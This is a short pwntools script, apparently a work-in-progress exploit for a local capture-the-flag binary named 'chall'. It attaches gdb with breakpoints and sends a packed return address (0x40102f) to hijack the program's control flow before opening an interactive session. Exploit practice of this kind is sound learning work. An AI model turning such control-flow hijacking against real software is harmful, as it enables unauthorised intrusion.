from pwn import *

exe = ELF("./chall", checksec = False)
r = process(exe.path)
gdb.attach(r, gdbscript = '''
           b*_start+5
           b*_start+27
           c
           ''')
input()

payload = "0x000000000040102f"

r.sendlineafter(b"Sa", p64(0x000000000040102f))

r.interactive()